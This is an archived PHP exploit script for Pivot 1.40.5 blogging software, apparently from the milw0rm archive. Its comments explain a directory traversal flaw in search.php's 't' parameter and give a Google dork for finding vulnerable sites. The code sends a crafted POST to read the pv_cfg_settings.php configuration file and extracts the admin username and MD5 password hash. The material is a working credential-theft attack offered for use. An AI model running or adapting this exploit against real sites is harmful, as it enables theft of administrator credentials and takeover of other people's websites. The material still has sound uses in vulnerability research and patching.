<html><head><title>Pivot 1.40.5 Dreamwind load_template() Credentials Disclosure Exploit

</title></head><pre>&lt;?php
        /*

         Pivot 1.40.5 'Dreamwind' load_template() credentials disclosure exploit

         by Nine:Situations:Group::bookoo

         our site: http://retrogod.altervista.org/
         software site: http://www.pivotlog.net/

         Google dork: &quot;by Pivot - 1.40.5&quot;  +'Dreadwind' -pivotlog.net


         vulnerability:

         search.php - lines 98-109:

         ...
         // Set the template for the tags page
         if (!isset($Pivot_Vars['t']) || empty($Pivot_Vars['t'])) {
	     if (isset($Weblogs[$Current_weblog]['extra_template']) &amp;&amp; ($Weblogs[$Current_weblog]['extra_template']!=&quot;&quot;) ) {
	    	$template = $Weblogs[$Current_weblog]['extra_template'];
	     } else {
		$template = $Weblogs[$Current_weblog]['archive_template'];
	     }
         } else {
	      $template = $Pivot_Vars['t'];
         }

         $template_html = load_template($template);
         ...

         't' argument is passed to load_template() function without checks

         see load_template() function in /modules/module_parser.php - lines 778-797

         ...
         function load_template($basename) {
	     global $template_cache, $Paths;

	     $filename = $Paths['templates_path'].$basename;

	     if (isset($template_cache[$basename])) {
	    	return $template_cache[$basename];
	     } else {

	  	if (!(file_exists($filename))) {
	 		$filename = $Paths['templates_path'].&quot;entrypage_template.html&quot;;
		}
            $filetext=implode(&quot;&quot;, file($filename)); // &lt;----------------------------|_ lol !!!

		$template_cache[$basename]=$filetext;

		return $filetext;
	 }

        }
        ...

        our argument is passed to a file() function, so, regardless of php settings,
        we can see php files at screen trough directory traversal attacks, including the
        configuration file (pv_cfg_settings.php), which cointains the admin credentials
        (username/md5 hash/sessions...)

        note: 't' can be passed as GET or POST
        ----------------------------------------------------------------------------

        If you think this poc is useful, please help us to improve our equipment and
        donate through the paypal button on our site!
        */

        error_reporting(7);
        $host=$argv[1];
        $path=$argv[2];
        $argv[3] ? $port = (int) $argv[3] : $port = 80;
        $argv[2] ? print(&quot;attackin'...\n&quot;) : die (&quot;syntax: php &quot;.$argv[0].&quot; [host] [path] [[port]]&quot;);

        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
        $win ? dl(&quot;php_curl.dll&quot;) : dl(&quot;php_curl.so&quot;);

        $url = &quot;http://$host:$port&quot;;

        $exploit=&quot;t=../pv_cfg_settings.php&quot;;

        $header =&quot;POST &quot;.$path.&quot;search.php HTTP/1.0\r\n&quot;;
        $header.=&quot;Host: $host\r\n&quot;;
        $header.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
        $header.=&quot;Content-Length: &quot;.strlen($exploit).&quot;\r\n&quot;;
        $header.=&quot;Connection: Close\r\n\r\n&quot;;
        $header.=$exploit;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $header);


        $data = curl_exec($ch); if (curl_errno($ch)) {
           print curl_error($ch).&quot;\n&quot;;
        } else {
           curl_close($ch);
        }
        // print $data.&quot;\n&quot;;
        preg_match(&quot;/userlevel\|4\|/&quot;,$data) ? print(&quot;exploit succeeded!&quot;) : die(&quot;exploit failed!&quot;);
        $tmp=explode(&quot;user-&quot;,$data);$tmpii=explode(&quot;!&quot;,$tmp[1]);$admin=$tmpii[0];
        print &quot;\n\nadmin user: &quot;.$admin.&quot;\n&quot;;
        $tmp=explode(&quot;pass|&quot;,$data);$tmpii=explode(&quot;|&quot;,$tmp[1]);$hash=$tmpii[0];
        print &quot;\nmd5 hash  : &quot;.$hash.&quot;\n&quot;;


?&gt;

# milw0rm.com [2008-06-30]</pre></html>